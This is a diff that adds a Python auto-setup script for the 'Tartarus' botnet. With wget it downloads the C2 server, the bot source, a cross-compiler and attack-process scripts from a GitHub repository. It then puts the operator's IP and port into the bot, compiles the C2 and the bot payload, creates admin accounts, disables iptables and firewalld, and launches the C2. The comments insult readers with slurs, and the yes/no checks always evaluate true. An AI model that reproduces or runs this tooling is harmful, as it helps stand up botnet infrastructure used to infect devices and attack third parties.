@@ -1,0 +1,207 @@
+# Setup By Georgia Cri / FlexingOnLamers
+import subprocess, time
+
+def Tartarus(cmd):
+    subprocess.call(cmd, shell=True)
+def Cri(file_name, line_num, text):
+  lines = open(file_name, 'r').readlines()
+  lines[line_num] = text
+  out = open(file_name, 'w')
+  out.writelines(lines)
+  out.close()
+
+# Well ladies and retards, since none of you know how to setup my bOtNeT bc your retarded, heres an autosetup
+#///////////////////////
+# Colors and such
+dred = "\x1b[0;31m"
+dblue = "\x1b[0;34m"
+dcyan = "\x1b[0;36m"
+red = "\x1b[1;31m"
+blue = "\x1b[1;34m"
+cyan = "\x1b[1;36m"
+white = "\x1b[1;37m"
+#///////////////////////
+# File Paths
+IPHM = "scripts/"
+#///////////////////////
+print(""+ white +"Credits:")
+time.sleep(1)
+print(""+ white +"AutoSetup Developer: "+ red +"Georgia Cri "+ white +"/ "+ red +"FlexingOnLamers "+ cyan +"#RIPKatura")
+time.sleep(1)
+print(""+ white +"Tartarus  Developers: "+ cyan +"@"+ red +"FlexingOnLamers "+ white +"and "+ cyan +"@"+ red +"Transmissional")
+time.sleep(1)
+print(""+ white +"IPLookup Api: "+ red +"N/A")
+time.sleep(1)
+print(""+ white +"Domain Resolver: "+ red +"Snickers")
+time.sleep(1)
+print(""+ white +"Installing Needed "+ red +"Dependencies "+ white +"And "+ red +"Packages "+ white +"before setting up..")
+time.sleep(2)
+#///////////////////////
+# Dependency Installation
+Tartarus("yum update -y")
+Tartarus("yum install python-paramiko gcc screen nano wget httpd iptables perl php php-pear -y")
+Tartarus("yum install gcc cmake gmp gmp-devel libpcap-devel gengetopt byacc flex -y")
+Tartarus("yum install json-c-doc.noarch json-c.i686 json-c.x86_64 json-c-devel.i686 json-c-devel.x86_64 -y")
+Tartarus("yum install epel-release -y")
+Tartarus("yum install gengetopt -y")
+Tartarus("yum install bzip2 -y")
+Tartarus("yum install lbzip2 -y")
+Tartarus("clear")
+#///////////////////////
+print(""+ red +"Finished!")
+time.sleep(2)
+#///////////////////////
+# Server ULIMIT Setup
+print("Setting Server ULIMIT and Downloading All files.")
+Tartarus("ulimit -n 999999")
+print(""+ red +"Finished!")
+time.sleep(2)
+Tartarus("clear")
+#///////////////////////
+print(""+ white +"'m going to collect a few things from you..")
+time.sleep(2)
+# User input (We are using this to replace said information inside of the Bot, C2Base)
+username = raw_input(""+ white +"Enter desired Username:"+ red +" ")
+password = raw_input(""+ white +"Enter desired Password:"+ red +" ")
+print(""+ white +"Setting up User: "+ red +"["+ white +""+ username +""+ red +"] "+ white +"With "+ cyan +"Administrator "+ white +"Account!")
+Tartarus("echo "+ username +" "+ password +" admin >> tartarus.txt")
+IP = raw_input(""+ white +"Enter your Servers IP:"+ red +" ")
+bport = raw_input(""+ white +"Enter your desired bot port:"+ red +" ")
+threads = raw_input(""+ white +"Enter desired threads to screen on:"+ red +" ")
+cport = raw_input(""+ white +"Enter your desired connection port:"+ red +" ")
+#///////////////////////
+print("Let's set up our directories")
+print(""+ white +"Creating Directory: "+ red +"["+ white +"/"+ red +"root"+ white +"/"+ red +"logs"+ white +"/"+ red +"]")
+time.sleep(1)
+print(""+ white +"Creating Directory: "+ red +"["+ white +"/"+ red +"root"+ white +"/"+ red +"scripts"+ white +"/"+ red +"]")
+time.sleep(1)
+print(""+ white +"Creating Directory: "+ red +"["+ white +"/"+ red +"root"+ white +"/"+ red +"amp"+ white +"/"+ red +"]")
+Tartarus("mkdir logs amp scripts")
+time.sleep(2)
+print(""+ red +"Finished!")
+print(""+ white +"Let's download everything")
+print(""+ white +"Downloading "+ red +"Tartarus Alpha..")
+Tartarus("wget -q https://raw.githubusercontent.com/virtualsociopath/Tartarus/master/Main/c2.c -O c2.c")
+time.sleep(2)
+print(""+ red +"Finished!")
+print(""+ white +"Downloading "+ red +"Tartarus Bot")
+Tartarus("wget -q https://raw.githubusercontent.com/virtualsociopath/Tartarus/master/Autosetup/bot.c -O bot.c")
+time.sleep(2)
+print(""+ red +"Finished!")
+print(""+ white +"Downloading "+ red +"Tartarus Cross-Compiler")
+Tartarus("wget -q https://raw.githubusercontent.com/virtualsociopath/Tartarus/master/Main/Tartarus.py -O Tartarus.py")
+time.sleep(2)
+print(""+ red +"Finished!")
+print(""+ white +"Downloading "+ red +"Resolver Header")
+Tartarus("wget -q https://raw.githubusercontent.com/virtualsociopath/Tartarus/master/Main/resolver.h -O resolver.h")
+time.sleep(2)
+print(""+ red +"Finished!")
+print(""+ white +"Downloading "+ red +"IPHM Scanner Process Killer")
+Tartarus("wget -q https://raw.githubusercontent.com/virtualsociopath/Tartarus/master/Main/scripts/IPHM_Scanner_Process_Killerv2.py -O IPHM_Scanner_Process_Killerv2.py")
+time.sleep(2)
+print(""+ red +"Finished!")
+print(""+ white +"Downloading "+ red +"IPHM Attack process killer")
+Tartarus("wget -q https://raw.githubusercontent.com/virtualsociopath/Tartarus/master/Main/scripts/IPHM_Attack_Process_Killerv2.py -O IPHM_Attack_Process_Killerv2.py")
+time.sleep(2)
+print(""+ red +"Finished!")
+print(""+ white +"Downloading "+ red +"IPLookup API")
+Tartarus("wget -q https://raw.githubusercontent.com/virtualsociopath/Tartarus/master/Main/iplookup.php -O iplookup.php")
+time.sleep(2)
+print(""+ red +"Finished!")
+time.sleep(2)
+Tartarus("clear")
+print(""+ white +"Let's replace the needed information inside of the "+ red +"Bot")
+print(""+ white +"Replacing "+ red +"IP "+ white +"And "+ red +"Bot Port inside of the Bot")
+Cri('bot.c', 182, 'unsigned char *Tartarus[] = {"'+ IP +':'+ bport+'"}; // <ServerIP>:<BotPort>\n')
+time.sleep(2)
+print(""+ red +"Finished!")
+time.sleep(2)
+Tartarus("clear")
+print(""+ white +"Now let's compile our C2 and BOT")
+comp = raw_input("Would you like to remove the raw .c file for the c2 after compiling? (y/n):")
+
+if comp == "y" or "Y":
+    Tartarus("gcc -o c2 c2.c -pthread")
+    Tartarus("rm -rf c2.c")
+elif comp == "n" or "N":
+    Tartarus("gcc -o c2 c2.c -pthread")
+
+print(""+ white +"Finished Compiling "+ red +"C2, "+ white +"time to compile our "+ red +"bot"+ white +"!")
+time.sleep(2)
+Tartarus("python Tartarus.py bot.c "+ IP +"")
+print("Make sure to copy your payload, im giving you 10 seconds "+ red +"<3")
+time.sleep(10)
+Tartarus("clear")
+print(""+ white +"Now that our directories are setup and our bots compiled, lets go ahead and move our files")
+print(""+ white +"Now lets move our needed files into the correct directories")
+time.sleep(2)
+print(""+ white +"Moving Script: "+ red +"["+ white +"IPHM_Attack_Process_Killerv2.py"+ red +"] "+ white +"To Directory: "+ red +"["+white +"/"+ red +"root"+ white +"/"+ red +"scripts"+ white +"/"+ red +"]")
+time.sleep(1)
+print(""+ white +"Moving Script: "+ red +"["+ white +"IPHM_Scanner_Process_Killerv2.py"+ red +"] "+ white +"To Directory: "+ red +"["+white +"/"+ red +"root"+ white +"/"+ red +"scripts"+ white +"/"+ red +"]")
+time.sleep(1)
+print(""+ white +"Moving Script: "+ red +"["+ white +"iplookup.php"+ red +"] "+ white +"To Directory: "+ red +"["+ white +"/"+ red +"var"+ white +"/"+ red +"www"+ white +"/"+ red +"html"+ white +"/"+ red +"]")
+Tartarus("mv IPHM_Attack_Process_Killerv2.py "+ IPHM +"")
+Tartarus("mv IPHM_Scanner_Process_Killerv2.py "+ IPHM +"")
+Tartarus("mv iplookup.php /var/www/html/")
+time.sleep(2)
+print(""+ red +"Finished!")
+cleanup = raw_input("Would you like to clean the server and get rid of all extra files? (y/n): ")
+
+if cleanup == "y" or "Y":
+    Tartarus("rm -rf Tartarus.py")
+    Tartarus("mkdir Cross-Compilers")
+    Tartarus("mv cross-compiler-* Cross-Compilers/")
+    print(""+ red +"Continuing!")
+elif cleanup == "n" or "N":
+    print(""+ red +"Continuing!")
+
+chatroom = raw_input(""+ white +"Would you like to install the Tartarus chatroom? (y/n): ")
+
+if chatroom == "y" or "Y":
+    print("Making Directory For chatroom: [/root/chat/]")
+    Tartarus("mkdir chatroom")
+    time.sleep(2)
+    chatport = raw_input("What port would you like to setup the chatroom on?: ")
+    time.sleep(1)
+    Tartarus("clear")
+    print("Compiling Chat Source")
+    time.sleep(2)
+    Tartarus("wget -q https://raw.githubusercontent.com/virtualsociopath/Tartarus/master/chatroom/chat.c -O chat.c")
+    Tartarus("gcc -o chat chat.c -pthread && rm -rf chat.c")
+    time.sleep(2)
+    print(""+ red +"Finished!")
+    print(""+ white +"Moving Chat Source to: "+ red +"["+ white +"/"+red +"root"+ white +"/"+ red +"chatroom"+ white +"/"+ red +"]")
+    Tartarus("mv chat chatroom/")
+    time.sleep(1)
+    print(""+ red +"Finished!")
+    print(""+ white +"Creating "+ red +"Admin Account "+ white +"on chat with user information for c2 - Username: "+ red +"["+ white +""+ username +""+ red +"]")
+    Tartarus("cd chatroom/ && echo "+ username +" "+ password +" admin >> chat.txt")
+    Tartarus("cd")
+    print(""+ white +"Now Setting chat up on Port: :"+ red +"["+ white +""+ chatport +""+ red +"]")
+    time.sleep(1)
+    print(""+ red +"Finished!")
+    Tartarus("clear")
+    Tartarus("cd chatroom/ && screen -dm ./chat 3981 1 "+ chatport +"")
+    Tartarus("cd")
+    print(""+ white +"IP: "+ red +"["+ white +""+ IP +""+ red +"] "+ white +"Port: "+ red +"["+ white +""+ chatport +""+ red +"] "+ white +"Type: "+ red +"["+ white +"Raw"+ red +"]")
+    time.sleep(2)
+    Tartarus("clear")
+elif chatroom == "n" or "N":
+    print("Continuing!")
+
+print("Disabling Firewalld And IPTables..")
+Tartarus("service iptables stop")
+Tartarus("service firewalld stop")
+time.sleep(1)
+print(""+ red +"Finished!")
+print("Resetting HTTPD")
+Tartarus("service httpd restart")
+time.sleep(1)
+print(""+ red +"Finished!")
+time.sleep(1)
+Tartarus('clear')
+print(""+ white +"Now we're done! lets screen and connect.")
+time.sleep(1)
+Tartarus("screen -dm ./c2 "+ bport +" "+ threads +" "+ cport +"")
+print(""+ white +"Its up! Information below!")
+print(""+ white +"IP: "+ red +"["+ white +""+ IP +""+ red +"]\r\n"+ white +"Port: "+ red +"["+ white +""+ cport +""+ red +"]\r\n"+ white +"Type: "+ red +"["+ white +"Raw"+ red +"]\r\n"+ white +"BotPort: "+ red +"["+ white +""+ bport +""+ red +"]\r\n"+ white +"Threads: "+ red +"["+ white +""+threads+""+ red +"]")
